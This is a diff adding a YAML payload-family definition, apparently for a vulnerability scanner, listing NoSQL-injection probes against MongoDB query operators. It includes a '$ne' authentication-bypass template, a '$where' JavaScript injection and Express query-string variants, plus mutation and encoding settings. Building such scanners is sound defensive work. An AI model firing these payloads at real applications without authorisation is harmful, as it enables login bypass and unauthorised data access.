@@ -1,0 +1,49 @@
+family_id: nosqli
+description: >-
+  NoSQL-injection probes targeting MongoDB query operators ($ne, $gt,
+  $where, $regex) and CouchDB / DynamoDB-style operator-overload sinks.
+  Conservative read-only seeds; the validator pairs each with a benign
+  control query for differential confirmation.
+cwe_ids: [943, 89]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: false
+payloads:
+  - id: mongo_ne_authn
+    template: '{"$ne":null}'
+    confidence: likely
+    notes: $ne operator — classic auth-bypass on Mongo find().
+  - id: mongo_gt_truthy
+    template: '{"$gt":""}'
+    confidence: likely
+    notes: $gt operator returning truthy on string sinks.
+  - id: mongo_regex_anchor
+    template: '{"$regex":"^.{0,1024}$"}'
+    confidence: suspected
+    notes: $regex with a bounded anchor; tests where $regex is honoured.
+  - id: mongo_where_canary
+    template: '{"$where":"return this.username == \"{canary}\""}'
+    confidence: suspected
+    notes: $where JS injection; canary marker in the comparator.
+  - id: query_string_ne
+    template: 'username[$ne]={canary}'
+    confidence: likely
+    notes: Express+qs query-string variant of $ne.
+  - id: query_string_regex
+    template: 'username[$regex]=^{canary}'
+    confidence: suspected
+    notes: Express+qs query-string variant of $regex.
+mutations:
+  - name: case_flip
+    description: Operator names are case-sensitive — flips produce known errors.
+  - name: whitespace_alt
+    description: JSON tolerates whitespace; tests parser robustness.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw JSON / form payload.
+  - name: url_only
+    stages: [url]
+    description: URL-encoded query-string variants.
